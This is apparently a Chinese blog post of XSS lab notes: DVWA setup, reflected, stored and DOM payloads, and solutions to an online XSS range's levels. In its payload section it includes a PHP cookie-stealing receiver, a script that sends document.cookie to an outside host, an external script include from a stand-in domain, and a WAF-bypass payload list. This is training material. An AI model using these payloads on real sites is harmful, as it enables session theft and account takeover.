@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>跨站脚本攻击_XSS | Hexo</title>
+  <meta name="description" content="DVWA配置1.DVWA-master解压缩，放到phpstudy的www目录下面，打开config目录，复制config.inc.php.dist文件，粘贴重命名为config.inc.php,然后打开文件修改$_DVWA[ ‘db_password’ ] &#x3D; ‘root’;   2.修改phpstudy配置文件php.ini，(allow_url_include&#x3D;Off)O">
+<meta property="og:type" content="article">
+<meta property="og:title" content="跨站脚本攻击_XSS">
+<meta property="og:url" content="http://example.com/2024/01/16/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-XSS/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="DVWA配置1.DVWA-master解压缩，放到phpstudy的www目录下面，打开config目录，复制config.inc.php.dist文件，粘贴重命名为config.inc.php,然后打开文件修改$_DVWA[ ‘db_password’ ] &#x3D; ‘root’;   2.修改phpstudy配置文件php.ini，(allow_url_include&#x3D;Off)O">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202154495.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116201939792.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202541713.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202604528.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202741004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202914223.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116203310713.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116203256751.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116211433330.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116211205971.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116211324308.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116211402922.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116211503378.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116204911214.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116205112670.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116205510501.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116205556077.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116205615750.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116205805909.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116210200458.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116210309196.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116210517405.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117144544161.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117144831002.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117145106989.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117150418088.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117151034627.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117151618850.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117153518524.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117153858481.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117154919384.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117154737219.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117155901370.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117161018651.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117162731564.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117165557794.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117165806471.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117173702811.png">
+<meta property="article:published_time" content="2024-01-16T02:15:32.000Z">
+<meta property="article:modified_time" content="2024-01-17T09:40:38.634Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202154495.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2024/01/16/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-XSS/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body class="main-center theme-black# 主题颜色 theme-black theme-blue theme-green theme-purple" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/hkbijihxl" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">hkbijihxl</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">汀花雨细，水树风闲，又是秋来。</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> changsha, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav menu-highlight">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/hkbijihxl" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://weibo.com/u/7832381828" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+
+    
+      
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a><span class="archive-list-count">12</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="title">权限维持</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-21T01:31:07.000Z" itemprop="datePublished">2024-01-21</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="title">命令执行漏洞</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-19T06:09:40.000Z" itemprop="datePublished">2024-01-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/19/beef/" class="title">beef</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-19T02:30:47.000Z" itemprop="datePublished">2024-01-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/16/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-XSS/" class="title">跨站脚本攻击_XSS</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-16T02:15:32.000Z" itemprop="datePublished">2024-01-16</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/12/%E9%9D%B6%E6%9C%BA-Hackademic/" class="title">靶机_Hackademic</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-12T02:58:38.000Z" itemprop="datePublished">2024-01-12</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-跨站脚本攻击-XSS" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      跨站脚本攻击_XSS
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2024/01/16/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-XSS/" class="article-date">
+	  <time datetime="2024-01-16T02:15:32.000Z" itemprop="datePublished">2024-01-16</time>
+	</a>
+</span>
+        
+        
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/01/16/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-XSS/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h4 id="DVWA配置"><a href="#DVWA配置" class="headerlink" title="DVWA配置"></a>DVWA配置</h4><p>1.DVWA-master解压缩，放到phpstudy的www目录下面，打开config目录，复制config.inc.php.dist文件，粘贴重命名为config.inc.php,然后打开文件修改$_DVWA[ ‘db_password’ ] &#x3D; ‘root’;</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202154495.png" alt="image-20240116202154495"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116201939792.png" alt="image-20240116201939792"></p>
+<p>2.修改phpstudy配置文件php.ini，(allow_url_include&#x3D;Off)Off改成On,重启phpstudy</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202541713.png" alt="image-20240116202541713"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202604528.png" alt="image-20240116202604528"></p>
+<p>3.访问(登录admin password)</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202741004.png" alt="image-20240116202741004"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116202914223.png" alt="image-20240116202914223"></p>
+<h4 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h4><h6 id="反射型-Reflected"><a href="#反射型-Reflected" class="headerlink" title="反射型(Reflected)"></a>反射型(Reflected)</h6><p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;	# 测试</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116203310713.png" alt="image-20240116203310713"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116203256751.png" alt="image-20240116203256751"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116211433330.png" alt="image-20240116211433330"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116211205971.png" alt="image-20240116211205971"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116211324308.png" alt="image-20240116211324308"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116211402922.png" alt="image-20240116211402922"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116211503378.png" alt="image-20240116211503378"></p>
+<h6 id="存储型-Stored"><a href="#存储型-Stored" class="headerlink" title="存储型(Stored)"></a>存储型(Stored)</h6><p>name输入框有字符长度限制，只能输10个字符，按F12查看</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116204911214.png" alt="image-20240116204911214"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116205112670.png" alt="image-20240116205112670"></p>
+<p>把10改成100，再输入，提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/好好好，这样摆是吧！！！/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116205510501.png" alt="image-20240116205510501"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116205556077.png" alt="image-20240116205556077"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116205615750.png" alt="image-20240116205615750"></p>
+<p>之后再输入其他的信息，都会弹窗</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116205805909.png" alt="image-20240116205805909"></p>
+<h4 id="作业-pikachu的xss关卡"><a href="#作业-pikachu的xss关卡" class="headerlink" title="作业(pikachu的xss关卡)"></a>作业(pikachu的xss关卡)</h4><h6 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字符长度限制，20改成200</span><br><span class="line">输入</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116210200458.png" alt="image-20240116210200458"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116210309196.png" alt="image-20240116210309196"></p>
+<h6 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">&lt;script&gt;alert(/好好好，这样摆是吧！！！/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240116210517405.png" alt="image-20240116210517405"></p>
+<p>之后输入其他的都会弹窗</p>
+<p>dom</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt; &lt;a href=javascript:alert(1)&gt;</span><br><span class="line">&#x27;&gt; &lt;a href=javascript:alert(/xss/)&gt;</span><br><span class="line"></span><br><span class="line">&#x27;onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<p>1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$cookie=$_GET[&#x27;cookie&#x27;]; </span><br><span class="line">file_put_contents(&#x27;cookie.txt&#x27;,$cookie); </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;document.location=&#x27;http://192.168.1.53/cookie.php?cookie=&#x27;+document.coo </span><br><span class="line">kie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.2.106/vulnerabilities/xss_r/?name=&lt;script&gt;document.location=&#x27;http://192.168.233.131/cookie.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;document.location=&#x27;http://192.168.233.131/cookie.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.233.131/cookie.php?cookie=security=low;%20PHPSESSID=lc588oprfqkft36phgota3s133</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt; </span><br><span class="line">window.onload = function() &#123; </span><br><span class="line">var link=document.getElementsByTagName(&quot;a&quot;); </span><br><span class="line">for(j = 0; j &lt; link.length; j++) &#123; </span><br><span class="line"> link[j].href=&quot;https://www.baidu.com&quot;;&#125; </span><br><span class="line">&#125; </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">XSS的攻击载荷</span><br><span class="line">以下所有标签的 &gt; 都可以用 // 代替， 例如 &lt;script&gt;alert(1)&lt;/script//</span><br><span class="line">&lt;script&gt;标签：&lt;script&gt;标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span><br><span class="line">svg标签</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;//</span><br><span class="line">&lt;img&gt;标签：</span><br><span class="line"></span><br><span class="line">&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie</span><br><span class="line">&lt;body&gt;标签：</span><br><span class="line"></span><br><span class="line">&lt;body οnlοad=alert(1)&gt;</span><br><span class="line">&lt;body οnpageshοw=alert(1)&gt;</span><br><span class="line">video标签:</span><br><span class="line"></span><br><span class="line">&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">style标签：</span><br><span class="line"></span><br><span class="line">&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</span><br><span class="line">绕过waf的常用语句</span><br><span class="line">    &lt;svg οnlοad=alert(1)&gt;</span><br><span class="line">    &lt;a href=javascript:alert(1)&gt;</span><br><span class="line">    &lt;IMG SRC=javascript:alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">    &lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">    &lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="在线靶场"><a href="#在线靶场" class="headerlink" title="在线靶场"></a>在线靶场</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss.tesla-space.com/level1.php?name=test</span><br></pre></td></tr></table></figure>
+
+<h6 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h6><p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117144544161.png" alt="image-20240117144544161"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117144831002.png" alt="image-20240117144831002"></p>
+<h6 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117145106989.png" alt="image-20240117145106989"></p>
+<h6 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#x27; onclick=&#x27;alert(1)&#x27;</span><br><span class="line">&#x27;onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117150418088.png" alt="image-20240117150418088"></p>
+<h6 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&quot; onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117151034627.png" alt="image-20240117151034627"></p>
+<h6 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=javascript:alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117151618850.png" alt="image-20240117151618850"></p>
+<h6 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a hREf=javascript:alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117153518524.png" alt="image-20240117153518524"></p>
+<h6 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117153858481.png" alt="image-20240117153858481"></p>
